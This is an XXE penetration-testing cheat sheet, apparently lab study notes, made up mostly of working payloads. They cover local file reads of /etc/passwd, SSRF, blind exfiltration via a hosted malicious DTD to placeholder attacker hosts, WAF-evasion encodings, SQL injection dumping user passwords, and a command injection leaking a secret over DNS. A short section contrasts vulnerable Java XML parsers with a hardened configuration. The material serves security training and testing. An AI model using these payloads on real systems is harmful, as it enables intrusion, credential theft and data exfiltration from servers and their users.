tactic: Multiple

**XXE** is when an attacker abuses an XML parser that processes external entity references  causing it to fetch local files, make internal network requests (SSRF), or exfiltrate data. Any application that parses XML and hasn't explicitly disabled external entities is potentially vulnerable.


**Referenced (Visible output)**  entity result is reflected in the response:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<firstName>&xxe;</firstName>
```

**Blind (No output)**  result is sent out-of-band, nothing reflected:


```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://COLLAB.com"> %xxe; ]>
```

---
## Injection Points

- XML request bodies (`Content-Type: application/xml` or `text/xml`)
- SOAP `<soap:Body>` parameters → see [[SOAP Manipulation (Simple Object Access Protocol)]]
- SVG file uploads
- SAML `SAMLResponse` → see [[SAML Injection  (Security Assertion Markup Language)]]
- XForms submissions:

```
Inject XXE into the XForm XML body  the server processes the xpath/node evaluation through its XML parser
```

- XInclude (when full DOCTYPE is not allowed)
- File uploads processed as XML (docx, xlsx, pptx are ZIP+XML internally)
- `Content-Type` switching — try changing `application/json` to `application/xml`

---

## Checklist

### Basic Detection

- [ ]  Inject a simple entity and check if it evaluates:

```xml
	<!DOCTYPE replace [<!ENTITY xxe "XXE_TEST"> ]>
	<userInfo><firstName>&xxe;</firstName></userInfo>
```

- [ ]  If response reflects `XXE_TEST` → entity injection confirmed

### File Read

- [ ]  Read `/etc/passwd`:

```xml
	<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
	<userInfo><firstName>&xxe;</firstName></userInfo>
```

- [ ]  Use PHP wrapper for base64 output (avoids encoding issues):

```xml
	<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
	<data>&xxe;</data>
```

### SSRF via XXE

- [ ]  Blind SSRF — trigger outbound request:

```xml
	<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://OASTIFY.com"> %xxe; ]>
```

- [ ]  Referenced SSRF — result reflected:

```xml
	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://OASTIFY.com"> ]>
	<firstName>&xxe;</firstName>
```

### Blind XXE — Exfiltrate via External DTD

- [ ]  Host `exploit.dtd` on exploit server:

```xml
	<!ENTITY % file SYSTEM "file:///etc/passwd">
	<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://OASTIFY.com/?x=%file;'>">
	%eval;
	%exfiltrate;
```

```
`&#x25;` = `%` (percent sign encoded to avoid parser conflict)
```

- [ ]  Trigger from the vulnerable endpoint:

```xml
	<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE users [<!ENTITY % xxe SYSTEM "https://EXPLOIT.net/exploit.dtd"> %xxe;]>
```

- [ ]  Trigger error-based exfil using invalid file path to leak content in error:


```xml
	<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>
```

### XInclude (when DOCTYPE is blocked)

- [ ]  Use when you can't control the full XML document — inject into a data value:

```xml
	<foo xmlns:xi="http://www.w3.org/2001/XInclude">
	    <xi:include parse="text" href="file:///etc/passwd"/>
	</foo>
```

- [ ]  XInclude SSRF:

```xml
	<?xml version="1.0" encoding="ISO-8859-1"?>
	<root xmlns:xi="http://www.w3.org/2001/XInclude">
	    <xi:include href="http://OASTIFY.com/"/>
	</root>
```

```
> Always URL encode the payload before sending
```

### SVG File Upload

- [ ]  Upload an SVG containing XXE:

```xml
	<?xml version="1.0" standalone="yes"?>
	<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
	<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"
	     xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
	    <text font-size="16" x="0" y="16">&xxe;</text>
	</svg>
```

### SOAP XXE

- [ ]  Inject inside CDATA in SOAP body:

```xml
	<soap:Body>
	    <foo>
	        <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://OASTIFY.com:22/"> %dtd;]><xxx/>]]>
	    </foo>
	</soap:Body>
```

### Encoding Bypass (WAF Evasion)

- [ ]  Base64 encoded payload:

```xml
	<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```

- [ ]  UTF-7 encoding:

```xml
	<?xml version="1.0" encoding="UTF-7"?>
	+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
	+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://OASTIFY.com+ACI +AD4AXQA+
	+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```

### SQL + XML + WAF Bypass (Hackvertor)

- [ ]  Identify XML math evaluation — inject `7*7` into a field, check if `49` is returned
- [ ]  If WAF blocks SQLi in XML — use Burp **Hackvertor** extension to hex-encode payload:

```xml
	<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
```

- [ ]  Read local file via SQL:

```xml
	<@hex_entities>1 UNION ALL SELECT load_file('/home/carlos/secret')<@/hex_entities>
```

- [ ]  Write to disk:

```xml
	<@hex_entities>1 UNION ALL SELECT load_file('/home/carlos/secret') INTO OUTFILE '/tmp/secret'<@/hex_entities>
```

### Command Injection via XXE

- [ ]  Inject command in entity value using backtick execution:

```xml
	<email>example@domain.com&`nslookup -q=cname $(cat /home/carlos/secret).burp.oastify.com`</email>
```

---

## White Box Testing

**Vulnerable — XXE enabled by default, no protection:**

```java
@PostMapping(value = "/api/user", consumes = "application/xml")
public ResponseEntity<?> createUser(@RequestBody String xmlBody) {
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    // ← no XXE protection configured — external entities will be resolved
    DocumentBuilder builder = factory.newDocumentBuilder();
    Document doc = builder.parse(new InputSource(new StringReader(xmlBody)));

    String name = doc.getElementsByTagName("firstName").item(0).getTextContent();
    return ResponseEntity.ok(userService.create(name));
}
```

**Vulnerable — XInclude not disabled:**

```java
@PostMapping("/api/process")
public ResponseEntity<?> process(@RequestBody String xmlBody) {
    SAXParserFactory factory = SAXParserFactory.newInstance();
    factory.setXIncludeAware(true);   // ← XInclude explicitly enabled
    factory.setNamespaceAware(true);
    SAXParser parser = factory.newSAXParser();
    // attacker injects <xi:include href="file:///etc/passwd"/>
}
```

**Vulnerable — SVG upload parsed without XXE protection:**

```java
@PostMapping("/upload/avatar")
public ResponseEntity<?> uploadAvatar(@RequestParam MultipartFile file) {
    // ← assumes SVG is safe, parses it directly
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    Document doc = factory.newDocumentBuilder()
        .parse(file.getInputStream()); // ← external entities resolved during parse
    return ResponseEntity.ok().build();
}
```

**Secure:**


```java
// Disable XXE — apply this to every DocumentBuilderFactory in the codebase
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
factory.setXIncludeAware(false);
factory.setExpandEntityReferences(false);

// For SAXParserFactory
SAXParserFactory saxFactory = SAXParserFactory.newInstance();
saxFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
saxFactory.setXIncludeAware(false);

// For Spring — if using RestTemplate or HttpMessageConverter with XML
// Use Jackson XML instead of JAXB where possible, and configure it safely:
XmlMapper xmlMapper = new XmlMapper();
xmlMapper.configure(FromXmlParser.Feature.EMPTY_ELEMENT_AS_NULL, true);
// XMLInputFactory used by Jackson — disable DTD
XMLInputFactory xmlInputFactory = XMLInputFactory.newInstance();
xmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, false);
xmlInputFactory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
```

---
## Labs

 **XXE Entity Example**
```http
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY xxe "XXE"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```
 
 **XXE inside SOAP Example**

```
<soap:Body>
  <foo>
    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]>
  </foo>
</soap:Body>
```

 **XXE inside SVG**

```
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text></svg>
```

 **XXE Base64 Encoded**
```
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```

 **XXE UTF-7 Exmaple**

```
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```

**XXE File Include**

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<userInfo>
 <firstName>John</firstName>
 <lastName>&xxe;</lastName>
</userInfo>

#Using wrappers

<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```


 **XInclude  file read**
To execute an `XInclude` attack, the `XInclude` namespace must be declared, and the file path for the intended external entity must be specified. Below is a succinct example of how such an attack can be formulated:

```XML
#URL encode the XXE payload before sending.

<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>
```

**Xinclude SSRF**

```XML
<?xml version="1.0" encoding="ISO-8859-1"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://collab/"></xi:include></root>
<XML BEGINNING>

```


**XXE  exfiltrate data using a malicious external DTD**

change the hosted file name to `/exploit.dtd` as the exploit file with Document Type Definition (DTD) extension, containing the following payload. The `&#x25;` is the Unicode hex character code for percent sign `%`.

we can trigger errors in the xml by inserting a an invalid file for example to maybe leak some sensitive error based  `<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">`

> store in the Exploit Server

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http:/OASTIFY.com/?x=%file;'>">
%eval;
%exfiltrate;
```

> Check /product/stock page and paste the payload:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE users [<!ENTITY % xxe SYSTEM "https://EXPLOIT.net/exploit.dtd"> %xxe;]>
```

 **XXE: Command injection**

[![image](https://user-images.githubusercontent.com/58632878/225074086-5357aeac-a445-47d8-87e8-a472bf874f6d.png)](https://user-images.githubusercontent.com/58632878/225074086-5357aeac-a445-47d8-87e8-a472bf874f6d.png)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<users>
    <user>
        <username>Example1</username>
        <email>example1@domain.com&`nslookup -q=cname $(cat /home/carlos/secret).burp.oastify.com`</email>
    </user>
</users>
```


 **SQL + XML + HackVertor**


vulnerabilities are _**identified**_ in a XML Post body and inserting mathematical expression such as `7x7` into field and observing the evaluated value.

[![identify-math-evaluated-xml](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/identify-math-evaluated-xml.png)](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/identify-math-evaluated-xml.png)
WAF detect attack when appending SQL

pass the WAF, Use Burp extension **Hackvertor** to [obfuscate](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study?tab=readme-ov-file#obfuscation) the SQL Injection payload in the XML post body.

```
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
```


SQLi payloads to read local file, or output to another folder on target.

```
<@hex_entities>1 UNION all select load_file('/home/carlos/secret')<@/hex_entities>  

<@hex_entities>1 UNION all select load_file('/home/carlos/secret') into outfile '/tmp/secret'<@/hex_entities>
```
#### Resources 

-  https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity  
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
- https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study?tab=readme-ov-file#xxe-injections
- https://github.com/DingyShark/BurpSuiteCertifiedPractitioner?tab=readme-ov-file#xss